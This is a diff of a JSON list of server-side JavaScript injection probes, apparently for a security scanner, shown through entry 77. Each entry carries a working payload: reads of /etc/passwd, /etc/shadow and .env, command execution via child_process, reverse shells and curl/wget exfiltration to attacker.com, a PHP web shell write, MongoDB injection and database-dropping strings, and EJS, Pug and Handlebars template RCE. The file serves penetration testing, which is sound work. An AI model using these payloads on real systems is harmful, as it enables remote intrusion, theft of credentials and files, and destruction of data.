@@ -3,2412 +3,1608 @@
     "id": "ssji-owasp-0001",
     "name": "Simple expressions",
     "template": "2+2",
-    "description": "Simple expressions probe from OWASP. Tests application handling of: 2+2",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple expressions probe from OWASP. Tests application handling of: 2+2"
   },
   {
     "id": "ssji-owasp-0002",
     "name": "Simple expressions #2",
     "template": "Math.random()",
-    "description": "Simple expressions probe from OWASP. Tests application handling of: Math.random()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple expressions probe from OWASP. Tests application handling of: Math.random()"
   },
   {
     "id": "ssji-owasp-0003",
     "name": "Simple expressions #3",
     "template": "Date.now()",
-    "description": "Simple expressions probe from OWASP. Tests application handling of: Date.now()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple expressions probe from OWASP. Tests application handling of: Date.now()"
   },
   {
     "id": "ssji-owasp-0004",
     "name": "Simple expressions #4",
     "template": "JSON.stringify({})",
-    "description": "Simple expressions probe from OWASP. Tests application handling of: JSON.stringify({})",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple expressions probe from OWASP. Tests application handling of: JSON.stringify({})"
   },
   {
     "id": "ssji-owasp-0005",
     "name": "Information disclosure",
     "template": "process.version",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: process.version",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: process.version"
   },
   {
     "id": "ssji-owasp-0006",
     "name": "Information disclosure #2",
     "template": "process.platform",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: process.platform",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: process.platform"
   },
   {
     "id": "ssji-owasp-0007",
     "name": "Information disclosure #3",
     "template": "process.arch",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: process.arch",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: process.arch"
   },
   {
     "id": "ssji-owasp-0008",
     "name": "Information disclosure #4",
     "template": "process.pid",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: process.pid",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: process.pid"
   },
   {
     "id": "ssji-owasp-0009",
     "name": "Information disclosure #5",
     "template": "process.cwd()",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: process.cwd()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: process.cwd()"
   },
   {
     "id": "ssji-owasp-0010",
     "name": "Information disclosure #6",
     "template": "process.env",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: process.env",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: process.env"
   },
   {
     "id": "ssji-owasp-0011",
     "name": "Information disclosure #7",
     "template": "global",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: global",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: global"
   },
   {
     "id": "ssji-owasp-0012",
     "name": "Information disclosure #8",
     "template": "this",
-    "description": "Information disclosure probe from OWASP. Tests application handling of: this",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Information disclosure probe from OWASP. Tests application handling of: this"
   },
   {
     "id": "ssji-owasp-0013",
     "name": "File system access",
     "template": "require('fs').readFileSync('/etc/passwd', 'utf8')",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('/e...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('/e..."
   },
   {
     "id": "ssji-owasp-0014",
     "name": "File system access #2",
     "template": "require('fs').readFileSync('/etc/shadow', 'utf8')",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('/e...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('/e..."
   },
   {
     "id": "ssji-owasp-0015",
     "name": "File system access #3",
     "template": "require('fs').readFileSync('/proc/self/environ', 'utf8')",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('/p...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('/p..."
   },
   {
     "id": "ssji-owasp-0016",
     "name": "File system access #4",
     "template": "require('fs').readdirSync('/').toString()",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readdirSync('/')...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readdirSync('/')..."
   },
   {
     "id": "ssji-owasp-0017",
     "name": "File system access #5",
     "template": "require('fs').readdirSync('/home').toString()",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readdirSync('/ho...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readdirSync('/ho..."
   },
   {
     "id": "ssji-owasp-0018",
     "name": "File system access #6",
     "template": "require('fs').readFileSync('package.json', 'utf8')",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('pa...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('pa..."
   },
   {
     "id": "ssji-owasp-0019",
     "name": "File system access #7",
     "template": "require('fs').readFileSync('.env', 'utf8')",
-    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('.e...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "File system access probe from OWASP. Tests application handling of: require('fs').readFileSync('.e..."
   },
   {
     "id": "ssji-owasp-0020",
     "name": "Basic command execution",
     "template": "require('child_process').execSync('whoami').toString()",
-    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0021",
     "name": "Basic command execution #2",
     "template": "require('child_process').execSync('id').toString()",
-    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0022",
     "name": "Basic command execution #3",
     "template": "require('child_process').execSync('pwd').toString()",
-    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0023",
     "name": "Basic command execution #4",
     "template": "require('child_process').execSync('ls -la').toString()",
-    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0024",
     "name": "Basic command execution #5",
     "template": "require('child_process').execSync('cat /etc/passwd').toString()",
-    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0025",
     "name": "Basic command execution #6",
     "template": "require('child_process').execSync('uname -a').toString()",
-    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic command execution probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0026",
     "name": "Reverse shell",
     "template": "require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')",
-    "description": "Reverse shell probe from OWASP. Tests application handling of: require('child_process').exec(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Reverse shell probe from OWASP. Tests application handling of: require('child_process').exec(..."
   },
   {
     "id": "ssji-owasp-0027",
     "name": "Reverse shell #2",
     "template": "require('child_process').exec('nc -e /bin/bash attacker.com 4444')",
-    "description": "Reverse shell probe from OWASP. Tests application handling of: require('child_process').exec(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Reverse shell probe from OWASP. Tests application handling of: require('child_process').exec(..."
   },
   {
     "id": "ssji-owasp-0028",
     "name": "Reverse shell #3",
     "template": "require('child_process').spawn('nc', ['-e', '/bin/bash', 'attacker.com', '4444'])",
-    "description": "Reverse shell probe from OWASP. Tests application handling of: require('child_process').spawn...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Reverse shell probe from OWASP. Tests application handling of: require('child_process').spawn..."
   },
   {
     "id": "ssji-owasp-0029",
     "name": "Data exfiltration",
     "template": "require('child_process').execSync('curl attacker.com/?data=$(cat /etc/passwd|base64)').toString()",
-    "description": "Data exfiltration probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Data exfiltration probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0030",
     "name": "Data exfiltration #2",
     "template": "require('child_process').execSync('wget --post-file=/etc/passwd attacker.com').toString()",
-    "description": "Data exfiltration probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Data exfiltration probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0031",
     "name": "Write backdoor",
     "template": "require('fs').writeFileSync('/tmp/backdoor.js', 'malicious code')",
-    "description": "Write backdoor probe from OWASP. Tests application handling of: require('fs').writeFileSync('/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Write backdoor probe from OWASP. Tests application handling of: require('fs').writeFileSync('/..."
   },
   {
     "id": "ssji-owasp-0032",
     "name": "Write backdoor #2",
     "template": "require('fs').writeFileSync('shell.php', '<?php system($_GET[\"cmd\"]); ?>')",
-    "description": "Write backdoor probe from OWASP. Tests application handling of: require('fs').writeFileSync('s...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Write backdoor probe from OWASP. Tests application handling of: require('fs').writeFileSync('s..."
   },
   {
     "id": "ssji-owasp-0033",
     "name": "Basic Function constructor",
     "template": "new Function('return 2+2')()",
-    "description": "Basic Function constructor probe from OWASP. Tests application handling of: new Function('return 2+2')()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic Function constructor probe from OWASP. Tests application handling of: new Function('return 2+2')()"
   },
   {
     "id": "ssji-owasp-0034",
     "name": "Basic Function constructor #2",
     "template": "new Function('return process.version')()",
-    "description": "Basic Function constructor probe from OWASP. Tests application handling of: new Function('return process.v...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic Function constructor probe from OWASP. Tests application handling of: new Function('return process.v..."
   },
   {
     "id": "ssji-owasp-0035",
     "name": "Basic Function constructor #3",
     "template": "new Function('return require(\"os\").userInfo()')()",
-    "description": "Basic Function constructor probe from OWASP. Tests application handling of: new Function('return require(\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic Function constructor probe from OWASP. Tests application handling of: new Function('return require(\"..."
   },
   {
     "id": "ssji-owasp-0036",
     "name": "RCE via Function constructor",
     "template": "new Function('return require(\"child_process\").execSync(\"whoami\").toString()')()",
-    "description": "RCE via Function constructor probe from OWASP. Tests application handling of: new Function('return require(\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "RCE via Function constructor probe from OWASP. Tests application handling of: new Function('return require(\"..."
   },
   {
     "id": "ssji-owasp-0037",
     "name": "RCE via Function constructor #2",
     "template": "new Function('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()",
-    "description": "RCE via Function constructor probe from OWASP. Tests application handling of: new Function('return global.pr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "RCE via Function constructor probe from OWASP. Tests application handling of: new Function('return global.pr..."
   },
   {
     "id": "ssji-owasp-0038",
     "name": "Basic MongoDB injection",
     "template": "admin' || '1'=='1",
-    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: admin' || '1'=='1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: admin' || '1'=='1"
   },
   {
     "id": "ssji-owasp-0039",
     "name": "Basic MongoDB injection #2",
     "template": "' || true || '",
-    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: ' || true || '",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: ' || true || '"
   },
   {
     "id": "ssji-owasp-0040",
     "name": "Basic MongoDB injection #3",
     "template": "' || '1'=='1' || '",
-    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: ' || '1'=='1' || '",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: ' || '1'=='1' || '"
   },
   {
     "id": "ssji-owasp-0041",
     "name": "Basic MongoDB injection #4",
     "template": "'; return true; //",
-    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: '; return true; //",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: '; return true; //"
   },
   {
     "id": "ssji-owasp-0042",
     "name": "Basic MongoDB injection #5",
     "template": "admin'; return true; //",
-    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: admin'; return true; //",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Basic MongoDB injection probe from OWASP. Tests application handling of: admin'; return true; //"
   },
   {
     "id": "ssji-owasp-0043",
     "name": "MongoDB data exfiltration",
     "template": "'; return this.password.match(/^a/); //",
-    "description": "MongoDB data exfiltration probe from OWASP. Tests application handling of: '; return this.password.match(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB data exfiltration probe from OWASP. Tests application handling of: '; return this.password.match(..."
   },
   {
     "id": "ssji-owasp-0044",
     "name": "MongoDB data exfiltration #2",
     "template": "'; return this.email.includes(\"admin\"); //",
-    "description": "MongoDB data exfiltration probe from OWASP. Tests application handling of: '; return this.email.includes(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB data exfiltration probe from OWASP. Tests application handling of: '; return this.email.includes(..."
   },
   {
     "id": "ssji-owasp-0045",
     "name": "MongoDB data exfiltration #3",
     "template": "'; return this.role == \"admin\"; //",
-    "description": "MongoDB data exfiltration probe from OWASP. Tests application handling of: '; return this.role == \"admin\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB data exfiltration probe from OWASP. Tests application handling of: '; return this.role == \"admin\"..."
   },
   {
     "id": "ssji-owasp-0046",
     "name": "MongoDB enumeration",
     "template": "'; var users = db.users.find(); return true; //",
-    "description": "MongoDB enumeration probe from OWASP. Tests application handling of: '; var users = db.users.find()...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB enumeration probe from OWASP. Tests application handling of: '; var users = db.users.find()..."
   },
   {
     "id": "ssji-owasp-0047",
     "name": "MongoDB enumeration #2",
     "template": "'; db.users.find().forEach(function(u){print(u)}); return true; //",
-    "description": "MongoDB enumeration probe from OWASP. Tests application handling of: '; db.users.find().forEach(fun...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB enumeration probe from OWASP. Tests application handling of: '; db.users.find().forEach(fun..."
   },
   {
     "id": "ssji-owasp-0048",
     "name": "MongoDB command execution (if possible)",
     "template": "'; require('child_process').execSync('whoami'); return true; //",
-    "description": "MongoDB command execution (if possible) probe from OWASP. Tests application handling of: '; require('child_process').ex...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB command execution (if possible) probe from OWASP. Tests application handling of: '; require('child_process').ex..."
   },
   {
     "id": "ssji-owasp-0049",
     "name": "MongoDB command execution (if possible) #2",
     "template": "'; var fs = require('fs'); fs.readFileSync('/etc/passwd'); return true; //",
-    "description": "MongoDB command execution (if possible) probe from OWASP. Tests application handling of: '; var fs = require('fs'); fs....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB command execution (if possible) probe from OWASP. Tests application handling of: '; var fs = require('fs'); fs...."
   },
   {
     "id": "ssji-owasp-0050",
     "name": "MongoDB DoS",
     "template": "'; while(true){}; //",
-    "description": "MongoDB DoS probe from OWASP. Tests application handling of: '; while(true){}; //",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB DoS probe from OWASP. Tests application handling of: '; while(true){}; //"
   },
   {
     "id": "ssji-owasp-0051",
     "name": "MongoDB DoS #2",
     "template": "'; db.users.drop(); return true; //",
-    "description": "MongoDB DoS probe from OWASP. Tests application handling of: '; db.users.drop(); return tru...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB DoS probe from OWASP. Tests application handling of: '; db.users.drop(); return tru..."
   },
   {
     "id": "ssji-owasp-0052",
     "name": "MongoDB DoS #3",
     "template": "'; db.dropDatabase(); return true; //",
-    "description": "MongoDB DoS probe from OWASP. Tests application handling of: '; db.dropDatabase(); return t...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "MongoDB DoS probe from OWASP. Tests application handling of: '; db.dropDatabase(); return t..."
   },
   {
     "id": "ssji-owasp-0053",
     "name": "Handlebars RCE",
     "template": "{{#with \"s\" as |string|}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with \"s\" as |string|}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with \"s\" as |string|}}"
   },
   {
     "id": "ssji-owasp-0054",
     "name": "Handlebars RCE #2",
     "template": "{{#with \"e\"}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with \"e\"}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with \"e\"}}"
   },
   {
     "id": "ssji-owasp-0055",
     "name": "Handlebars RCE #3",
     "template": "{{#with split as |conslist|}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with split as |conslist|}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with split as |conslist|}}"
   },
   {
     "id": "ssji-owasp-0056",
     "name": "Handlebars RCE #4",
     "template": "{{this.pop}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this.pop}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this.pop}}"
   },
   {
     "id": "ssji-owasp-0057",
     "name": "Handlebars RCE #5",
     "template": "{{this.push (lookup string.sub \"constructor\")}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this.push (lookup string.sub...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this.push (lookup string.sub..."
   },
   {
     "id": "ssji-owasp-0058",
     "name": "Handlebars RCE #6",
     "template": "{{#with string.split as |codelist|}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with string.split as |codel...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with string.split as |codel..."
   },
   {
     "id": "ssji-owasp-0059",
     "name": "Handlebars RCE #7",
     "template": "{{this.push \"return require('child_process').execSync('whoami');\"}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this.push \"return require('c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this.push \"return require('c..."
   },
   {
     "id": "ssji-owasp-0060",
     "name": "Handlebars RCE #8",
     "template": "{{#each conslist}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#each conslist}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#each conslist}}"
   },
   {
     "id": "ssji-owasp-0061",
     "name": "Handlebars RCE #9",
     "template": "{{#with (string.sub.apply 0 codelist)}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with (string.sub.apply 0 co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{#with (string.sub.apply 0 co..."
   },
   {
     "id": "ssji-owasp-0062",
     "name": "Handlebars RCE #10",
     "template": "{{this}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{this}}"
   },
   {
     "id": "ssji-owasp-0063",
     "name": "Handlebars RCE #11",
     "template": "{{/with}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{/with}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{/with}}"
   },
   {
     "id": "ssji-owasp-0064",
     "name": "Handlebars RCE #12",
     "template": "{{/each}}",
-    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{/each}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Handlebars RCE probe from OWASP. Tests application handling of: {{/each}}"
   },
   {
     "id": "ssji-owasp-0065",
     "name": "Simplified Handlebars payload",
     "template": "{{this.constructor}}",
-    "description": "Simplified Handlebars payload probe from OWASP. Tests application handling of: {{this.constructor}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simplified Handlebars payload probe from OWASP. Tests application handling of: {{this.constructor}}"
   },
   {
     "id": "ssji-owasp-0066",
     "name": "Simplified Handlebars payload #2",
     "template": "{{this.constructor.constructor}}",
-    "description": "Simplified Handlebars payload probe from OWASP. Tests application handling of: {{this.constructor.constructor...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simplified Handlebars payload probe from OWASP. Tests application handling of: {{this.constructor.constructor..."
   },
   {
     "id": "ssji-owasp-0067",
     "name": "6. EJS TEMPLATE INJECTION",
     "template": "<%= global.process.mainModule.require('child_process').execSync('whoami') %>",
-    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= global.process.mainModule....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= global.process.mainModule...."
   },
   {
     "id": "ssji-owasp-0068",
     "name": "6. EJS TEMPLATE INJECTION #2",
     "template": "<%= require('child_process').execSync('cat /etc/passwd').toString() %>",
-    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= require('child_process').e...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= require('child_process').e..."
   },
   {
     "id": "ssji-owasp-0069",
     "name": "6. EJS TEMPLATE INJECTION #3",
     "template": "<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf8') %>",
-    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= global.process.mainModule....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= global.process.mainModule...."
   },
   {
     "id": "ssji-owasp-0070",
     "name": "6. EJS TEMPLATE INJECTION #4",
     "template": "<%= process.env %>",
-    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= process.env %>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= process.env %>"
   },
   {
     "id": "ssji-owasp-0071",
     "name": "6. EJS TEMPLATE INJECTION #5",
     "template": "<%= JSON.stringify(process.env) %>",
-    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= JSON.stringify(process.env...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "6. EJS TEMPLATE INJECTION probe from OWASP. Tests application handling of: <%= JSON.stringify(process.env..."
   },
   {
     "id": "ssji-owasp-0072",
     "name": "7. PUG/JADE TEMPLATE INJECTION",
     "template": "#{global.process.mainModule.require('child_process').execSync('id')}",
-    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: #{global.process.mainModule.re...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: #{global.process.mainModule.re..."
   },
   {
     "id": "ssji-owasp-0073",
     "name": "7. PUG/JADE TEMPLATE INJECTION #2",
     "template": "#{function(){return require('child_process').execSync('whoami')}()}",
-    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: #{function(){return require('c...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: #{function(){return require('c..."
   },
   {
     "id": "ssji-owasp-0074",
     "name": "7. PUG/JADE TEMPLATE INJECTION #3",
     "template": "#{require('child_process').execSync('cat /etc/passwd').toString()}",
-    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: #{require('child_process').exe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: #{require('child_process').exe..."
   },
   {
     "id": "ssji-owasp-0075",
     "name": "7. PUG/JADE TEMPLATE INJECTION #4",
     "template": "- var x = global.process.mainModule.require('child_process').execSync('ls').toString()",
-    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: - var x = global.process.mainM...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: - var x = global.process.mainM..."
   },
   {
     "id": "ssji-owasp-0076",
     "name": "7. PUG/JADE TEMPLATE INJECTION #5",
     "template": "= x",
-    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: = x",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "7. PUG/JADE TEMPLATE INJECTION probe from OWASP. Tests application handling of: = x"
   },
   {
     "id": "ssji-owasp-0077",
